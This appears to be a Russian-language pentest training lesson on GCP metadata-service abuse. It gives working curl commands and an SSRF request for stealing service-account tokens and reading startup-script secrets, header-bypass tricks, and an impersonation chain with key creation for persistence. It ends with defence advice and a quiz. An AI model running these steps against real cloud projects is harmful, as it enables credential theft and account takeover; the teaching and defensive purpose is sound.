---
id: cloud-gcp-metadata
title: "GCP metadata: service-account токены и их захват"
category: cloud
parent: cloud-gcp-deep
difficulty: hard
order: 1
tags: [cloud, gcp, metadata, service-account, ssrf, oauth, gke]
prerequisites: [cloud-gcp-deep, cloud-ec2-ssrf]
useful_for:
  - "Захват сервисного аккаунта через SSRF/RCE в GCP"
  - "Пентест GCE, Cloud Run, Cloud Functions, GKE"
  - "Продвижение от токена к имперсонации"
estimated_minutes: 50
summary: "Как устроен metadata-сервис GCP, чем он отличается от AWS IMDS, как через SSRF/RCE получить OAuth-токен сервисного аккаунта и как из токена вырастить имперсонацию и доступ к ресурсам."
---

## Зачем этот урок

В GCP нет IAM-роли «на инстансе» в AWS-смысле. Вместо этого каждый ресурс (Compute Engine, Cloud Run, Cloud Functions, GKE-под) имеет **привязанный сервисный аккаунт**, а его **OAuth2 access token** выдаётся локальным metadata-сервисом по адресу `metadata.google.internal` (`169.254.169.254`). Любая SSRF или RCE на GCP-ресурсе превращается в кражу токена. Токен — это `Bearer`, который работает против Google Cloud API в пределах прав сервисного аккаунта и его **scopes**. Этот урок — про устройство metadata-сервиса GCP, его отличия от AWS IMDS и практическую цепочку «SSRF → токен → имперсонация → ресурсы».

## Как устроен metadata-сервис GCP

Базовый адрес:

```
http://metadata.google.internal/computeMetadata/v1/
http://169.254.169.254/computeMetadata/v1/
```

**Ключевое отличие от AWS:** GCP требует заголовок `Metadata-Flavor: Google` на каждый запрос. Без него сервер вернёт `403 Forbidden`. Это частичная защита от «тупой» SSRF, которая не умеет добавлять заголовки, но она обходится, если уязвимость позволяет инъекцию заголовков или редирект.

Полезные пути:

| Путь | Что отдаёт |
|------|-----------|
| `instance/service-accounts/default/token` | OAuth2 access token + expires_in |
| `instance/service-accounts/default/email` | email сервисного аккаунта |
| `instance/service-accounts/default/scopes` | список scopes |
| `instance/service-accounts/<sa-email>/token` | токен конкретного SA |
| `project/project-id` | id проекта |
| `instance/attributes/` | кастомные метаданные (startup-script, ssh-keys) |
| `instance/attributes/ssh-keys` | публичные SSH-ключи, добавленные через metadata |
| `instance/network-interfaces/` | сетевые интерфейсы и внутренние IP |
| `instance/identity` | идентичность для Workload Identity (GKE) |

Особенность GCP: **scope ≠ permission**. Токен может иметь scope `cloud-platform` (широкий API-доступ), но реальные права всё равно ограничены IAM-ролями сервисного аккаунта. И наоборот: узкий scope может отрезать API, даже если роль широкая. Поэтому после кражи токена нужно проверить и scopes, и фактические права.

В GKE с **Workload Identity** под обращается к metadata-сервису GKE, который выдаёт токен привязанного **Google service account (GSA)**. Kubernetes service account (KSA) маппится на GSA аннотацией. Если маппинг сделан с широкими правами, компромисс пода = компромисс GSA.

## Инструменты и команды

Прямое чтение (изнутри ресурса):

```bash
# Токен
curl -s -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
# => {"access_token":"ya29...","expires_in":3599,"token_type":"Bearer"}

# Email и scopes
curl -s -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email"
curl -s -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes"

# Кастомные метаданные
curl -s -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/attributes/?recursive=true"
```

Использование токена против API:

```bash
TOKEN=$(curl -s -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" | jq -r .access_token)

curl -s -H "Authorization: Bearer $TOKEN" \
  "https://cloudresourcemanager.googleapis.com/v1/projects" | jq .
```

Разведка прав:

```bash
# gcloud с токеном (gcloud auth login --access-token-file)
echo "$TOKEN" > /tmp/tok
gcloud auth login --access-token-file=/tmp/tok --quiet
gcloud auth list
gcloud projects list
gcloud iam service-accounts list
```

## Разобранный пример: от SSRF к токену и имперсонации

Сценарий: на Cloud Run есть SSRF, позволяющая делать GET с произвольным URL. Цель — забрать токен runtime SA.

Шаг 1 — если SSRF умеет добавлять заголовки (или через редирект), обращаемся к metadata:

```
GET /fetch?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
Header: Metadata-Flavor: Google
```

Ответ: JSON с `access_token`. Если SSRF не умеет заголовки, пробуем варианты: инъекция CRLF в URL, редирект с внешнего сервера на metadata, `gopher://`, или использовать компонент, который сам ставит `Metadata-Flavor` (некоторые Google SDK делают это автоматически).

Шаг 2 — проверяем, кто мы и какие scopes:

```bash
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://www.googleapis.com/oauth2/v1/tokeninfo?access_token=$TOKEN"
```

Шаг 3 — разведка ресурсов. Токен может читать Storage, Secret Manager, проекты:

```bash
curl -s -H "Authorization: Bearer $TOKEN" "https://storage.googleapis.com/storage/v1/b?project=my-project"
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://secretmanager.googleapis.com/v1/projects/my-project/secrets"
```

Шаг 4 — **имперсонация**. Если у SA есть право `iam.serviceAccounts.getAccessToken` (или `iam.serviceAccounts.actAs`), можно выпустить токен другого сервисного аккаунта — часто более привилегированного:

```bash
curl -s -X POST -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/target-sa@my-project.iam.gserviceaccount.com:generateAccessToken" \
  -d '{"scope":["https://www.googleapis.com/auth/cloud-platform"],"lifetime":"3600s"}'
# => {"accessToken":"ya29...","expireTime":"..."}
```

Шаг 5 — при наличии `iam.serviceAccounts.getAccessToken` на admin-SA получаем `roles/owner` проекта. Дальше — экспорт ключа (`keys.create`) для персистентности или прямое управление IAM.

Цепочка: `SSRF → metadata token → SA с getAccessToken → имперсонация admin-SA → owner`.

## Варианты атак и обходы

- **Metadata header bypass.** Если SSRF не умеет заголовки, ищите компоненты, которые их ставят: Google Cloud-клиентские библиотеки, прокси, серверные фетчеры. Иногда достаточно перенаправить запрос на `metadata.google.internal` с заголовком, который сервер подставит.
- **DNS rebinding.** Если SSRF валидирует хост по имени, а затем резолвит его повторно, DNS rebinding на `169.254.169.254` обходит allowlist.
- **GKE metadata server.** В Workload Identity под получает токен через `169.254.169.254` (GKE metadata server) — тот же путь, но требует `Metadata-Flavor`. Имперсонация KSA→GSA раскрывает GSA.
- **Startup-script в metadata.** Кастомные метаданные часто содержат `startup-script`, где лежат токены, пароли БД, ключи API. Читайте `instance/attributes/?recursive=true`.
- **SSH-ключи в metadata.** `instance/attributes/ssh-keys` даёт список ключей и позволяет понять, кто имеет доступ; иногда там временные ключи.
- **Service account keys.** Если у вас `iam.serviceAccountKeys.create`, выпустите JSON-ключ для долгоживущего доступа.
- **Scopes как ограничение.** Если scope узкий (`devstorage.read_only`), не тратьте время на IAM-эскалацию — сначала поищите ресурс с широким scope.

## Частые ошибки и подводные камни

- **Забыть заголовок `Metadata-Flavor: Google`.** Без него ответ — 403; многие SSRF-пейлоады падают здесь.
- **Путать scope и permission.** `cloud-platform` scope не означает admin; смотрите IAM-роли SA.
- **Считать токен долгоживущим.** По умолчанию ~1 час; планируйте обновление, повторяя запрос к metadata.
- **Игнорировать `default` vs конкретный SA.** `.../service-accounts/default/token` — самый частый путь; конкретный SA указывается по email.
- **Не проверять имперсонацию.** Токен SA без `getAccessToken` всё ещё может читать Secrets/Storage — не сдавайтесь после первой ошибки.
- **Ошибка на GKE.** Если под без Workload Identity, metadata может отдавать токен **node** SA (широкий!) — это часто лучше, чем KSA.

## Защита и детект

- **Metadata concealment / GKE metadata server.** Включайте, чтобы под не видел node-level metadata.
- **Минимальные роли SA.** Runtime SA не должен иметь `getAccessToken`, `setIamPolicy`, `serviceAccountKeys.create`.
- **Workload Identity с узким GSA.** Маппьте KSA на GSA с минимальными правами, не на default compute SA.
- **Отключайте legacy metadata endpoints.** `--metadata=disable-legacy-endpoints=true`.
- **Детект.** Cloud Audit Logs: `GenerateAccessToken`, `GenerateIdToken`, `GetServiceAccount`, `CreateServiceAccountKey`. Алерты на вызовы metadata-эндпоинтов с необычных IP (если есть VPC Flow Logs / Cloud IDS), на имперсонацию вне CI, на создание ключей.
- **Org policies.** `iam.disableServiceAccountKeyCreation` запрещает выпуск ключей; `iam.allowedPolicyMemberDomains` ограничивает внешних участников.

## Сравнение metadata-сервисов трёх облаков

| Облако | Адрес | Заголовок | Особенность |
|--------|-------|-----------|-------------|
| AWS EC2 | 169.254.169.254 | IMDSv2: токен + `X-aws-ec2-metadata-token` | hop limit, IMDSv2 защищает от SSRF |
| AWS ECS | 169.254.170.2 | нет | relative URI в env |
| GCP | metadata.google.internal | `Metadata-Flavor: Google` | scope ≠ permission, имперсонация |
| Azure | 169.254.169.254 | `Metadata: true` | `api-version`, managed identity |

Понимание этих различий критично: пейлоад под AWS не сработает на GCP без правильного заголовка, а логика имперсонации есть только в GCP.

## GKE и Workload Identity: отдельный случай

В GKE идентичность пода устроена иначе, чем в Compute Engine, и это важно для атакующего. По умолчанию под обращается к metadata-сервису **узла** и получает токен сервисного аккаунта **ноды** — обычно это `default` compute SA, который в старых кластерах имеет роль `Editor` на проект. Это означает, что компромисс любого пода даёт очень широкий доступ. Именно поэтому Google ввёл **Workload Identity**: под больше не видит node metadata, а обращается к GKE metadata server, который выдаёт токен **привязанного GSA**. Связь задаётся аннотацией Kubernetes service account:

```yaml
apiVersion: v1
kind: ServiceAccount
metadata:
  name: app-ksa
  annotations:
    iam.gke.io/gcp-service-account: app-gsa@my-project.iam.gserviceaccount.com
```

При проверке кластера смотрите: (1) включён ли Workload Identity на node pool (`gcloud container node-pools describe ... --format='value(config.workloadMetadataConfig)'`), (2) есть ли аннотация у KSA, (3) какие роли у GSA. Если Workload Identity не включён, под видит node SA — и это часто самая быстрая эскалация. Если включён, но GSA имеет широкие роли (например, `roles/editor` или `secretmanager.admin`), вы всё равно получаете много. Отдельно проверьте `iam.workloadIdentityUser` bindings: кто может имперсонировать GSA.

Практическая проверка изнутри пода:

```bash
curl -s -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email"
# app-gsa@my-project.iam.gserviceaccount.com  (Workload Identity)
# ИЛИ
# 1234567890-compute@developer.gserviceaccount.com  (node SA — плохо)
```

## Что дальше / решение

Metadata GCP — вход в сервисный аккаунт. После кражи токена: (1) проверьте scopes и `tokeninfo`; (2) перечислите доступные ресурсы (проекты, Storage, Secret Manager); (3) обязательно проверьте право `getAccessToken` — имперсонация почти всегда даёт самый быстрый рост привилегий; (4) при наличии `serviceAccountKeys.create` выпустите ключ для персистентности. Если вы в GKE, посмотрите, не отдаётся ли node SA — это часто шире KSA. Записывайте цепочку и найденные секреты, они открывают следующий шаг.

## Квиз

```quiz
- question: "Какой заголовок обязателен для запроса к metadata-сервису GCP?"
  options:
    - "Metadata-Flavor: Google"
    - "X-aws-ec2-metadata-token"
    - "Metadata: true"
    - "Authorization: Bearer"
  answer: 0
  explanation: "GCP требует Metadata-Flavor: Google, иначе 403."
- question: "Что означает scope cloud-platform в GCP?"
  options:
    - "Доступ к API разрешён, но реальные права задаёт IAM-роль сервисного аккаунта"
    - "Полные права администратора"
    - "Только чтение Storage"
    - "Доступ отключён"
  answer: 0
  explanation: "Scope ограничивает API-поверхность, а permission определяются IAM-ролями."
- question: "Какое право позволяет выпустить токен другого сервисного аккаунта?"
  options:
    - "iam.serviceAccounts.getAccessToken"
    - "storage.objects.get"
    - "compute.instances.get"
    - "logging.logEntries.list"
  answer: 0
  explanation: "getAccessToken (и actAs) позволяет имперсонацию другого SA."
- question: "Где в metadata GCP часто лежат секреты и скрипты?"
  options:
    - "В instance/attributes/ (например, startup-script)"
    - "В instance/network-interfaces/"
    - "В project/project-id"
    - "В instance/identity"
  answer: 0
  explanation: "Кастомные метаданные содержат startup-script, ssh-keys и другие артефакты."
```

## Где пригодится

- **Пентест GCP:** SSRF/RCE на GCE, Cloud Run, Functions, GKE.
- **Red team:** эскалация от runtime SA к admin через имперсонацию.
- **Bug bounty:** облачные программы Google Cloud.
- **Blue team:** аудит прав SA и детект имперсонации.
